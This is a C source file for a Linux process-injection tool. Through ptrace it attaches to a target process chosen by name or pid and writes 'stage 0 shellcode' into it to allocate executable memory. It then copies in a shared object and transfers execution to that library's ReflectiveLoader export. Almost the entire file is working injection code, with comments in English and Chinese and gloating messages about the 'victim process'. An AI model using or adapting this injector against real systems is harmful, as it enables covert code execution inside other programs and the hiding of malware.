#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/user.h>
#include <wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <elf.h>

#include "utils.h"
#include "ptrace.h"

/*
 * Copy a file from disk into a memory buffer. WARNING Does not check size!
 */
__attribute__((always_inline)) inline unsigned int 
copy_in(int fd, void *address)
{
	int cc;
	off_t offset = 0;
	char buf[1024];

	while (0 < (cc = read(fd, buf, sizeof(buf))))
	{
		memcpy((address + offset), buf, cc);
		offset += cc;
	}

	return offset;
}



//将共享对象映射到内存并返回指向它的指针，如果出现错误，则返回null
Elf64_Ehdr* map_shared_object_into_memory(char *path)
{
	struct stat sb;
	unsigned int fd;
	fd = open(path, O_RDONLY);
	if(fd == -1)
	{
		printf("[-] Could not open shared object\n");
		exit(-1);
	}

	if (0 > stat(path, &sb))
	{
		return NULL;
	}

	void *mapped = mmap(NULL, sb.st_size + 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	if(mapped == -1)
	{
		return NULL;
	}

	mapped += (unsigned long)(0x1000 - ((unsigned long)mapped & 0x00000FFF));

	//Copy file on disk into memory map
	copy_in(fd, mapped);
	close(fd);
	
	return (Elf64_Ehdr *)mapped;
}

__attribute__((always_inline)) inline void*
crt_mmap(void *start, unsigned long length, int prot, int flags, int fd, unsigned long offset)
{
	void *ret;
	register long r10 asm("r10") = flags;
	register long r9 asm("r9") = offset;
	register long r8 asm("r8") = fd;

	__asm__ volatile ("syscall" : "=a" (ret) : "a" (__NR_mmap),
		      "D" (start), "S" (length), "d" (prot), "r" (r8), "r" (r9), "r" (r10) : 
		      "cc", "memory", "rcx", "r11");

	return ret;
}

/*
 * Allocate RWX memory region to copy shared object into (this is stage0 shellcode which is injected into target process)
 */
void* injectSharedLibrary(unsigned int size)
{
	return crt_mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
}

/*
 * injectSharedLibrary_end()
 *
 * This function's only purpose is to be contiguous to injectSharedLibrary(),
 * so that we can use its address to more precisely figure out how long
 * injectSharedLibrary() is.
 *
 */

void injectSharedLibrary_end()
{
}

int main(int argc, char** argv)
{
	if(argc < 4)
	{
		usage(argv[0]);
		return 1;
	}

	char* command = argv[1];
	char* commandArg = argv[2];
	char* libname = argv[3];
	//realpath是用来将参数path所指的相对路径转换成绝对路径
	char* libPath = realpath(libname, NULL);

	Elf64_Ehdr *so;
	char* processName = NULL;
	pid_t target = 0;

	struct user_regs_struct oldregs, regs;

	if(!libPath)
	{
		fprintf(stderr, "can't find file \"%s\"\n", libname);
		return 1;
	}
    //commandArg为名称的时候
	if(!strcmp(command, "-n"))
	{
		processName = commandArg;
		//通过进程名称找到它的pid
		target = findProcessByName(processName);
		if(target == -1)
		{
			fprintf(stderr, "doesn't look like a process named \"%s\" is running right now\n", processName);
			return 1;
		}

		printf("[i] targeting process \"%s\" with pid %d\n", processName, target);
	}
	 //commandArg为pid的时候
	else if(!strcmp(command, "-p"))
	{
		target = atoi(commandArg);
		printf("[i] targeting process with pid %d\n", target);
	}
	else
	{
		usage(argv[0]);
		return 1;
	}

	//Save registers and ptrace_attach to process
	memset(&oldregs, 0, sizeof(struct user_regs_struct));
	memset(&regs, 0, sizeof(struct user_regs_struct));
    //附加
	ptrace_attach(target);
    //获取寄存器
	ptrace_getregs(target, &oldregs);
	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

	//Load shared object into memory 
	//映射so文件 
	so = map_shared_object_into_memory(libPath);
	printf("[+] shared object mapped at %p\n", so);

	if(so == NULL)
	{
		printf("[-] Failed to load our shared object into memory... exiting..\n");
	}

	//Determine if SO exports a function called ReflectiveLoader if it does not then we should exit
	//确定是否导出一个称为ReflectiveLoader的函数，如果它不存在，那么退出
	Elf64_Phdr *phdr = so->e_phoff + (void *)so;
	Elf64_Dyn *dynamic;
	Elf64_Sym *dynsym;
	char *dynstr;
	void* ReflectiveLoader = 0;
	
	//Find dynamic segment
	for(int i = 0; i < so->e_phnum; i++) 
	{ 	
		if(phdr[i].p_type == PT_DYNAMIC)
		{
			dynamic = phdr[i].p_offset + (void *)so;
			printf("[+] found dynamic segment at %p\n", dynamic);
			break;
		}
	}

	//Find .dynsym table for our SO
	for(int i = 0; dynamic[i].d_tag != DT_NULL; i++)
	{
		if(dynamic[i].d_tag == DT_SYMTAB)
		{
			dynsym = (unsigned long)dynamic[i].d_un.d_val + (unsigned long)so;
			printf("[+] dynsym found at address %p\n", dynsym);
			break;
		}
	}
	
	//find .dynstr table for our SO
	for(int i = 0; dynamic[i].d_tag != DT_NULL; i++)
	{
		if(dynamic[i].d_tag == DT_STRTAB)
		{
			dynstr = (char *)(dynamic[i].d_un.d_val) + (unsigned long)so;
			printf("[+] dynstr found at address %p\n", dynstr);
			break;			
		}
	}

	//Find address of ReflectiveLoader symbol.. either it blows up here or the SO exports ReflectiveLoader function ;)
	for(int i = 0; ;i++) 
	{
		if(strcmp((dynsym[i].st_name + dynstr), "ReflectiveLoader") == 0)
		{
			ReflectiveLoader = dynsym[i].st_value;
			printf("[+] Resolved ReflectiveLoader offset to %p\n", ReflectiveLoader);
			break;		
		}
	}

	//Calculate the size of our injection shellcode
	struct stat sb;
	//就是so文件的大小
	stat(libPath, &sb);
	unsigned int size = sb.st_size;

	//Find some executable memory which we can use to write our shellcode into
	//找到一些可执行的内存，用来编写代码 
	long addr = freespaceaddr(target) + sizeof(long);

	//Setup registers to correct location
	printf("[i] Setting target registers to appropriate values\n");
	regs.rip = addr;
	regs.rdi = size + 0x1000;
	regs.rax = 9;
	regs.rdx = 7;
	regs.r8 = -1;
	regs.r9 = 0;
	regs.r10 = 34;

	ptrace_setregs(target, &regs);

	// figure out the size of injectSharedLibrary() so we know how big of a buffer to allocate. 
	size_t injectSharedLibrary_size = (intptr_t)injectSharedLibrary_end - (intptr_t)injectSharedLibrary;

	// back up whatever data used to be at the address we want to modify.
	//备份要修改的地址所使用的任何数据
	char* backup = malloc(injectSharedLibrary_size * sizeof(char));
	ptrace_read(target, addr, backup, injectSharedLibrary_size);

	// set up a buffer to hold the code we're going to inject into the
	// target process.
	//设置一个缓冲区来保存将要注入目标进程的代码
	char* newcode = malloc(injectSharedLibrary_size * sizeof(char));
	memset(newcode, 0, injectSharedLibrary_size * sizeof(char));

	// copy the code of injectSharedLibrary() to a buffer.
	memcpy(newcode, injectSharedLibrary, injectSharedLibrary_size - 1);

	// find return address of injectSharedLibrary and overwrite it with software breakpoint
	//找到注入共享库的返回地址并用软件断点重写
	intptr_t injectSharedLibrary_ret = (intptr_t)findRet(injectSharedLibrary_end) - (intptr_t)injectSharedLibrary;
	newcode[injectSharedLibrary_ret] = INTEL_INT3_INSTRUCTION;

	// copy injectSharedLibrary()'s code to the target address
	printf("[i] Overwriting target memory region with shellcode\n");
	ptrace_write(target, addr, newcode, injectSharedLibrary_size);

	//let the target run our injected code
	printf("[+] Transfering execution to stage 0 shellcode\n");
	//run
	ptrace_cont(target);

	// at this point, the target should have run mmap
	//此时，目标应该已经运行MMAP
	struct user_regs_struct mmap_regs;
	memset(&mmap_regs, 0, sizeof(struct user_regs_struct));
	ptrace_getregs(target, &mmap_regs);
	unsigned long long targetBuf = mmap_regs.rax;

	printf("[+] Returned from Stage 0 shell code RIP of target is %p\n", mmap_regs.rip);
	printf("[i] Stage 0 mmap returned memory address of %p.. verifying allocation succeeded..\n", mmap_regs.rax);
    //判断是否为读写执行
	if(isRWX(target, mmap_regs.rax) == -1)
	{
		fprintf(stderr, "mmap() failed to allocate memory\n");
		//还原现场断续执行
		restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs);
		free(backup);
		free(newcode);
		return -1;
	}

	printf("[+] Okay.. mmap allocation was successful!\n");

	//Get page aligned address of RWX memory region in target process
	void *so_inject_addr = mmap_regs.rax;
	so_inject_addr += (unsigned long)(0x1000 - ((unsigned long)so_inject_addr & 0x00000FFF));

	printf("[+] Writing our shared object into the victim process address space MUAHAHAHA!!!\n");
	//ptrace_write our SO into this buffer (could use process_vm_writev to speed up transfer of data)
	ptrace_write(target, (unsigned long)so_inject_addr, (void *)so, size);
	
	printf("[+] Setting RIP to ReflectiveLoader function\n");
	//Modify program registers to point to this memory region and call the ReflectiveLoader function
	regs.rip = (unsigned long)ReflectiveLoader + so_inject_addr;
	ptrace_setregs(target, &regs);

	printf("[+] Calling ReflectiveLoader function! Let's hope this works ;D\n");
	ptrace_cont(target);

	//Restore state and detach
	restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs);
	free(backup);
	free(newcode);

}
